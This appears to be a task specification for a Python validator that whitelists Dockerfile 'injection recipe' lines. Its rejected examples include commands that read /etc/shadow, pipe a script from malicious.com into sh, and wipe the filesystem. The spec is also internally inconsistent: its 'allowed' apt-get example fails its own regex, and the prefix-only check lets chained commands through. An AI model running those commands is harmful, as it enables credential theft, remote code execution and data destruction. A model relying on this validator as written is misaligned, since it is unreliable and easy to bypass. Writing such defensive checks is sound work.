  <action>
Add a utility function `validate_injection_recipe()` that validates Dockerfile injection recipes against a whitelist.

**Function signature:**
```python
def validate_injection_recipe(recipe: Optional[str]) -> tuple[bool, Optional[str]]:
    """
    Validates injection_recipe against whitelist.
    Returns (is_valid, error_message).
    If recipe is None or empty, returns (True, None) — optional field.
    """
```

**Whitelist rules:**
1. **RUN commands:** Only allow `RUN pip install`, `RUN apt-get install`, `RUN apk add`, `RUN npm install`, `RUN yum install`
   - Regex pattern: `RUN\s+(pip|apt-get|apk|npm|yum)\s+install\b`
   - REJECT: `RUN cat`, `RUN curl`, `RUN wget`, `RUN rm`, `RUN bash -c`, any other RUN variant
   
2. **Other allowed instructions:** `ENV`, `COPY`, `ARG`
   - Lines starting with these (case-insensitive) are permitted
   - Format: `ENV KEY=VALUE`, `COPY src dest`, `ARG ARG_NAME=default`

3. **Comments and blank lines:** Ignored (lines starting with `#` or empty)

**Implementation steps:**
1. If recipe is None or empty string, return (True, None) — optional field
2. Split recipe by newlines
3. For each non-empty, non-comment line:
   - Check if it's a RUN instruction → must match one of the allowed package managers
   - Check if it's ENV, COPY, or ARG → allow
   - Otherwise → error
4. Collect all errors and return (False, error_list) if any violations found
5. Return (True, None) if all lines pass

**Example allowed recipe:**
```dockerfile
RUN pip install requests==2.28.1
RUN apt-get update && apt-get install -y curl
ENV AGENT_PORT=8001
COPY config.json /app/config.json
ARG BASE_IMAGE=alpine:3.18
```

**Example rejected recipe:**
```dockerfile
RUN cat /etc/shadow  # ❌ not a package manager
RUN curl https://malicious.com | sh  # ❌ not a package manager
RUN rm -rf /  # ❌ not a package manager
```

**Error message format:**
```
"Recipe validation failed: Line 2: RUN instruction must use package managers (pip, apt-get, apk, npm, yum)"
```

Place this function at the module level in `models.py`, not inside a class. Use `import re` if not already present.
